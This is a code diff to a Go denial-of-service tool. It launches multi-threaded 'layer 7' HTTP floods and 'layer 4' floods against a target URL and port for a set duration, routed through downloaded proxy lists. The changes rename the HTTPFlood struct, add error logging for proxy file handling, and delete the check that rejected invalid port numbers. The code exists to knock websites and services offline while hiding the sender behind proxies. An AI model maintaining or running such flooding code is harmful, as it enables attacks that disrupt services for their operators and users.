@@ -103,7 +103,7 @@ func runLayer7(method string, cfg *config.Config) {
 	log.Printf("Attack started → %s | method: %s | threads: %d | duration: %ds", targetURL, method, threadCount, duration)
 
 	for i := 0; i < threadCount; i++ {
-		flood := &attack.HttpFlood{
+		flood := &attack.HTTPFlood{
 			TargetURL:  targetURL,
 			Host:       host,
 			Method:     method,
@@ -143,10 +143,6 @@ func runLayer4(method string, cfg *config.Config) {
 		log.Println("Port not specified, defaulting to 80")
 		u.port = 80
 	}
-	if u.port > 65535 {
-		fatal("Invalid port")
-	}
-
 	threadCount, _ := strconv.Atoi(os.Args[3])
 	duration, _ := strconv.Atoi(os.Args[4])
 
@@ -296,7 +292,9 @@ func loadProxies(cfg *config.Config, proxyFile string, proxyType int, testURL st
 	fullPath := filepath.Join(dataDir(), "proxies", proxyFile)
 	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
 		log.Println("Proxy file not found, downloading proxies...")
-		os.MkdirAll(filepath.Dir(fullPath), 0755)
+		if err := os.MkdirAll(filepath.Dir(fullPath), 0755); err != nil {
+			log.Printf("Cannot create proxy dir: %v", err)
+		}
 		proxies := proxy.DownloadFromConfig(cfg, proxyType)
 		if testURL != "" {
 			proxies = proxy.CheckAll(proxies, testURL, 5*time.Second, 200)
@@ -308,7 +306,9 @@ func loadProxies(cfg *config.Config, proxyFile string, proxyType int, testURL st
 		for _, p := range proxies {
 			sb.WriteString(p.String() + "\n")
 		}
-		os.WriteFile(fullPath, []byte(sb.String()), 0644)
+		if err := os.WriteFile(fullPath, []byte(sb.String()), 0644); err != nil {
+			log.Printf("Cannot write proxy file: %v", err)
+		}
 		return proxies
 	}
 
